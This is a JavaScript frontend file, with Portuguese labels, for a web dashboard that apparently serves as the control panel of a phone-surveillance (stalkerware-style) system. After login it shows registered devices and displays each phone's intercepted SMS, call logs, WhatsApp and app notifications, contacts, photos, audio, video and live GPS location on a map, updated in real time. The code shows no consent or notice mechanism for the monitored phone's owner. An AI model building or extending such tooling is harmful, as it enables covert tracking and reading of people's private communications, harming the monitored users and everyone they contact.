// main.js — frontend logic (login, socket, map, sections, media preview)
const API_BASE = '/api';
const tokenKey = 'monitor_jwt';
const userKey = 'monitor_user';

function setLoggedIn(user, token){
  localStorage.setItem(tokenKey, token);
  localStorage.setItem(userKey, JSON.stringify(user));
}
function getToken(){ return localStorage.getItem(tokenKey); }
function getUser(){ try { return JSON.parse(localStorage.getItem(userKey) || 'null'); } catch(e){return null} }
function logout(){
  localStorage.removeItem(tokenKey); localStorage.removeItem(userKey);
  location.reload();
}
document.getElementById('btnLogout').addEventListener('click', logout);

async function apiPost(path, body, token=getToken()){
  const res = await fetch(API_BASE + path, {
    method:'POST',
    headers: {'Content-Type':'application/json', ...(token?{Authorization:'Bearer '+token}:{})},
    body: JSON.stringify(body)
  });
  let txt = await res.text();
  try { return { ok:res.ok, status: res.status, json: JSON.parse(txt) }; } catch(e){ return { ok:res.ok, status: res.status, text: txt }; }
}
async function apiGet(path, token=getToken()){
  const res = await fetch(API_BASE + path, { headers: { ...(token?{Authorization:'Bearer '+token}:{}) } });
  if (!res.ok) return null;
  return res.json();
}
async function apiDownload(path, token=getToken()){
  const res = await fetch(API_BASE + path, { headers: { ...(token?{Authorization:'Bearer '+token}:{}) } });
  if (!res.ok) throw new Error('download failed: ' + res.status);
  return res.blob();
}

/* ---------- Login / Register ---------- */
document.getElementById('btnLogin').addEventListener('click', async () => {
  await handleAuth('/auth/login');
});
document.getElementById('btnRegister').addEventListener('click', async () => {
  await handleAuth('/auth/register', true);
});

async function handleAuth(endpoint, isRegister=false){
  const u = document.getElementById('username').value.trim();
  const p = document.getElementById('password').value;
  const loginMsg = document.getElementById('loginMsg'); loginMsg.textContent = '';
  if (!u || !p) { loginMsg.textContent = 'Preencha usuário e senha'; return; }
  const r = await apiPost(endpoint, { username: u, password: p });
  if (isRegister){
    if (r.ok && r.json && r.json.ok) {
      loginMsg.style.color='green'; loginMsg.textContent = 'Registado com sucesso. Inicie sessão.';
    } else {
      loginMsg.style.color='red'; loginMsg.textContent = r.json && r.json.error ? r.json.error : (r.text || 'Erro no registo');
    }
    return;
  } else {
    if (r.ok && r.json && r.json.token) {
      setLoggedIn(r.json.user, r.json.token);
      showDashboard();
    } else {
      loginMsg.style.color='red';
      loginMsg.textContent = r.json && r.json.error ? r.json.error : (r.text || 'Login falhou');
    }
  }
}

/* ---------- Device register ---------- */
document.getElementById('btnRegisterDevice').addEventListener('click', async () => {
  const deviceId = document.getElementById('deviceIdInput').value.trim();
  const label = document.getElementById('deviceLabelInput').value.trim();
  const msg = document.getElementById('deviceMsg'); msg.textContent='';
  if (!deviceId) { msg.textContent = 'Device ID é obrigatório'; return; }
  const r = await apiPost('/auth/device/register', { deviceId, label }, getToken());
  if (r.ok && r.json && r.json.ok) {
    msg.style.color='green';
    msg.textContent = 'Device registado';
    loadDevices();
  } else {
    msg.style.color='red';
    msg.textContent = (r.json && r.json.error) || r.text || 'Erro ao registar device';
  }
});

/* ---------- UI: menu show/hide ---------- */
document.querySelectorAll('.menuBtn').forEach(b => {
  b.addEventListener('click', () => {
    const target = b.dataset.show;
    document.querySelectorAll('.panel').forEach(p => p.classList.add('hidden'));
    document.getElementById(target).classList.remove('hidden');

    // if map shown, invalidate size later
    if (target === 'mapSection' && map) setTimeout(()=>map.invalidateSize(),300);
  });
});

/* ---------- Dashboard bootstrap ---------- */
let socket = null;
let map = null;
let markersLayer = null;
function showDashboard(){
  document.getElementById('loginBox').classList.add('hidden');
  document.getElementById('dashboardPanel').classList.remove('hidden');
  document.getElementById('btnLogout').classList.remove('hidden');
  document.querySelectorAll('.panel').forEach(p => p.classList.add('hidden'));
  document.getElementById('devicesSection').classList.remove('hidden');

  const user = getUser();
  if (user) {
    document.getElementById('userLabel').textContent = user.username;
    document.getElementById('userLabel').classList.remove('hidden');
  }

  initSocket();
  renderAll();
  setInterval(renderAll, 8000);
}

/* ---------- Socket / realtime ---------- */
function initSocket(){
  if (socket || !getToken()) return;
  try {
    socket = io('/', { query: { token: getToken() } });
  } catch(e){ console.error('socket init err', e); return; }

  socket.on('connect', ()=>console.log('socket connected'));
  socket.on('disconnect', ()=>console.log('socket disconnected'));
  socket.on('location:new', (loc) => {
    console.log('location:new', loc);
    addMarkerToMap(loc);
  });
  socket.on('media:new', (m) => {
    console.log('media:new', m);
    loadMedia(); // refresh list
  });
  socket.on('notification:new', (n) => {
    console.log('notification:new', n);
    loadNotifs();
  });
}

/* ---------- Renderers ---------- */
async function renderAll(){
  await loadDevices();
  await loadSms();
  await loadCalls();
  await loadNotifs();
  await loadContacts();
  await loadMedia();
  // load locations only if map visible
  if (!document.getElementById('mapSection').classList.contains('hidden')) await loadLocations();
}

/* Devices */
async function loadDevices(){
  const data = await apiGet('/devices', getToken());
  const box = document.getElementById('devicesList'); box.innerHTML = '';
  if (!data || data.length === 0) { box.innerHTML = '<div>Nenhum dispositivo registado</div>'; return; }
  data.forEach(d => {
    const el = document.createElement('div');
    const online = d.lastSeen && (Date.now() - new Date(d.lastSeen)) < 120000;
    el.innerHTML = `<strong>${escapeHtml(d.label||d.deviceId)}</strong> <span style="color:${online?'green':'red'}">${online?'online':'offline'}</span><br/><small>LastSeen: ${d.lastSeen?new Date(d.lastSeen).toLocaleString():'never'}</small>`;
    box.appendChild(el);
  });
}

/* SMS */
async function loadSms(){
  const arr = await apiGet('/sms', getToken()) || [];
  const list = document.getElementById('smsList'); list.innerHTML = '';
  if (arr.length===0) list.innerHTML = '<li>Nenhuma SMS</li>';
  arr.forEach(s => {
    const li = document.createElement('li');
    li.innerHTML = `<b>${escapeHtml(s.sender||'unknown')}</b>: ${escapeHtml(s.message||'')} <span class="muted">(${new Date(s.timestamp).toLocaleString()})</span>`;
    list.appendChild(li);
  });
}

/* Calls */
async function loadCalls(){
  const arr = await apiGet('/call', getToken()) || [];
  const list = document.getElementById('callsList'); list.innerHTML = '';
  if (arr.length===0) list.innerHTML = '<li>Nenhuma chamada</li>';
  arr.forEach(c => {
    const li = document.createElement('li');
    li.innerHTML = `<b>${escapeHtml(c.number||'unknown')}</b> — ${escapeHtml(c.state||'')} <span class="muted">(${new Date(c.timestamp).toLocaleString()})</span>`;
    list.appendChild(li);
  });
}

/* Notifs */
async function loadNotifs(){
  const arr = await apiGet('/whatsapp', getToken()) || [];
  const list = document.getElementById('notifList'); list.innerHTML = '';
  if (arr.length===0) list.innerHTML = '<li>Nenhuma notificação</li>';
  arr.forEach(n => {
    const li = document.createElement('li');
    li.innerHTML = `<b>${escapeHtml(n.packageName||'')}</b>: ${escapeHtml(n.message||'')} <span class="muted">(${new Date(n.timestamp).toLocaleString()})</span>`;
    list.appendChild(li);
  });
}

/* Contacts */
async function loadContacts(){
  const arr = await apiGet('/contacts', getToken()) || [];
  const list = document.getElementById('contactsList'); list.innerHTML = '';
  if (arr.length===0) list.innerHTML = '<li>Nenhum contacto</li>';
  arr.forEach(c => {
    const li = document.createElement('li');
    li.innerHTML = `<b>${escapeHtml(c.name||'')}</b> — ${escapeHtml(c.number||'')}`;
    list.appendChild(li);
  });
}

/* Media */
let currentMediaDoc = null;
async function loadMedia(){
  const arr = await apiGet('/media', getToken()) || [];
  const container = document.getElementById('mediaList'); container.innerHTML = '';
  if (arr.length===0) container.innerHTML = '<div>Nenhuma media</div>';
  arr.forEach(m => {
    const row = document.createElement('div'); row.style.margin='8px 0';
    const previewBtn = document.createElement('button'); previewBtn.textContent='Ver'; previewBtn.className='small';
    previewBtn.addEventListener('click', ()=>openMedia(m));
    const dlBtn = document.createElement('button'); dlBtn.textContent='Download'; dlBtn.className='small';
    dlBtn.addEventListener('click', ()=>downloadMedia(m));
    row.appendChild(document.createTextNode((m.filename||m._id)+' '));
    row.appendChild(previewBtn); row.appendChild(dlBtn);
    container.appendChild(row);
  });
}

function openMedia(m){
  currentMediaDoc = m;
  const viewer = document.getElementById('mediaViewer');
  const preview = document.getElementById('mediaPreview'); preview.innerHTML = '';
  // decide type
  if (m.contentType && m.contentType.startsWith('image/')){
    const img = document.createElement('img'); img.style.maxWidth='100%';
    img.src = `/api/media/${m._id}?_t=${Date.now()}`; // token is required via Authorization header for download; will use fetch for actual blob when clicking download
    preview.appendChild(img);
  } else if (m.contentType && m.contentType.startsWith('audio/')){
    const audio = document.createElement('audio'); audio.controls=true;
    audio.src = `/api/media/${m._id}?_t=${Date.now()}`;
    preview.appendChild(audio);
  } else if (m.contentType && m.contentType.startsWith('video/')){
    const v = document.createElement('video'); v.controls=true; v.style.maxWidth='100%';
    v.src = `/api/media/${m._id}?_t=${Date.now()}`;
    preview.appendChild(v);
  } else {
    preview.textContent = 'Pré-visualização não disponível. Use Download.';
  }
  document.getElementById('mediaDownloadBtn').onclick = ()=>downloadMedia(currentMediaDoc);
  document.getElementById('mediaCloseBtn').onclick = ()=>{ document.getElementById('mediaViewer').classList.add('hidden'); };
  viewer.classList.remove('hidden');
}

async function downloadMedia(m){
  try {
    const blob = await apiDownload('/media/' + m._id, getToken());
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a'); a.href = url; a.download = m.filename || 'file';
    document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
  } catch (e) {
    console.error('download failed', e);
    alert('Falha no download. Ver console para detalhes.');
  }
}

/* Locations / map */
async function loadLocations(){
  const arr = await apiGet('/location', getToken()) || [];
  if (!map) initMap();
  if (!markersLayer) markersLayer = L.layerGroup().addTo(map);
  markersLayer.clearLayers();
  arr.reverse().forEach(loc => addMarkerToMap(loc, false));
  if (arr.length) map.setView([arr[0].lat, arr[0].lon], 13);
}

function initMap(){
  map = L.map('map',{ center:[0,0], zoom:2 });
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{ attribution:'© OpenStreetMap contributors' }).addTo(map);
  markersLayer = L.layerGroup().addTo(map);
}

function addMarkerToMap(loc, fly=true){
  if (!map) initMap();
  if (!markersLayer) markersLayer = L.layerGroup().addTo(map);
  if (!loc || isNaN(Number(loc.lat)) || isNaN(Number(loc.lon))) return;
  const mk = L.marker([Number(loc.lat), Number(loc.lon)]);
  const popup = `<b>${escapeHtml(loc.deviceId||'')}</b><br/>${Number(loc.lat).toFixed(5)}, ${Number(loc.lon).toFixed(5)}<br/>${new Date(loc.timestamp).toLocaleString()}`;
  mk.bindPopup(popup).addTo(markersLayer);
  if (fly) map.setView([Number(loc.lat), Number(loc.lon)], 14);
}

/* ---------- Helpers ---------- */
function escapeHtml(s){ if (!s && s!==0) return ''; return String(s).replace(/[&<>"']/g, c=>({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c])); }

/* ---------- Init on load ---------- */
window.addEventListener('load', ()=>{
  // restore UI if logged
  if (getToken()){
    document.getElementById('loginBox').classList.add('hidden');
    document.getElementById('dashboardPanel').classList.remove('hidden');
    showDashboard();
  } else {
    document.getElementById('loginBox').classList.remove('hidden');
    document.getElementById('dashboardPanel').classList.add('hidden');
  }
});
